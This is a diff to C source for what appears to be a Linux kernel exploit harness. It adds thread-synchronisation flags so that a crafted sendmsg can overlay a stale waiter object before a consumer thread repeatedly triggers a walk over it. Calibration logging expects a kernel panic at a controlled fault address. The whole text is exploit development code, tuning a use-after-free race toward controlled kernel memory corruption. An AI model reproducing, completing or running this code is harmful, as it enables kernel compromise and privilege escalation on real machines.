@@ -135,6 +135,8 @@ atomic_int owner_chain_done;
 atomic_int route_done;
 atomic_int waiter_tid;
 atomic_int punch_consume_go;
+atomic_int overlay_ready;
+atomic_int walk_done;
 atomic_int punch_consume_stop;
 atomic_int consumer_calls;
 atomic_int consumer_success;
@@ -280,8 +282,18 @@ void do_pvm_calib_route(void) {
   } else {
     pr_error("calib socketpair errno=%d\n", errno);
   }
-  pr_info("calib: overlays placed; consumer walk should panic with a "
-          "0x5?00?000 fault address\n");
+  atomic_store(&main_route_delay_usec, 0);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&punch_consume_go, 1);
+  atomic_store(&overlay_ready, 1);
+  for (volatile long spin = 0;
+       !atomic_load(&walk_done) && spin < 400000000L; spin++) {
+  }
+  pr_info("calib: walk_done=%d calls=%d success=%d (no panic = overlay "
+          "missed the waiter)\n", atomic_load(&walk_done),
+          atomic_load(&consumer_calls), atomic_load(&consumer_success));
 }
 
 /* PVM_ROUTE=1: real overlay.  One crafted sendmsg leaves the stale-waiter
@@ -313,6 +325,11 @@ void do_pvm_overlay_route(void) {
           (unsigned long long)(uintptr_t)siov[0].iov_base,
           (unsigned long long)(uintptr_t)siov[1].iov_base);
 
+  atomic_store(&main_route_delay_usec, 0);
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&punch_consume_go, 1);
   int pair[2];
   if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, pair) == 0) {
     memset(&msg, 0, sizeof(msg));
@@ -329,6 +346,13 @@ void do_pvm_overlay_route(void) {
   } else {
     pr_error("pvm overlay socketpair errno=%d\n", errno);
   }
+  atomic_store(&overlay_ready, 1);
+  for (volatile long spin = 0;
+       !atomic_load(&walk_done) && spin < 400000000L; spin++) {
+  }
+  pr_info("pvm overlay: walk_done=%d calls=%d success=%d\n",
+          atomic_load(&walk_done), atomic_load(&consumer_calls),
+          atomic_load(&consumer_success));
 }
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -384,6 +408,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
       continue;
     }
     seen = seq;
+    while (!atomic_load(&overlay_ready) && !atomic_load(&punch_consume_stop))
+      __asm__ volatile("yield" ::: "memory");
     int tid = atomic_load(&waiter_tid);
     int calls_this_seq = 0;
     while (!atomic_load(&punch_consume_stop) &&
@@ -414,6 +440,11 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
         calls_this_seq++;
         if (calls_this_seq >= CONSUMER_MAX_CALLS) {
+          atomic_store(&walk_done, 1);
+          pr_info("consumer: walk fired tid=%d ret=%ld errno=%d calls=%d "
+                  "success=%d\n", tid, sched_ret, sched_errno,
+                  atomic_load(&consumer_calls),
+                  atomic_load(&consumer_success));
           atomic_store(&punch_consume_go, 0);
           break;
         }
@@ -429,6 +460,7 @@ void reset_main_route_state(void) {
   atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
   atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
   atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
+  atomic_store(&overlay_ready, 1); atomic_store(&walk_done, 0);
   atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
   atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
   atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
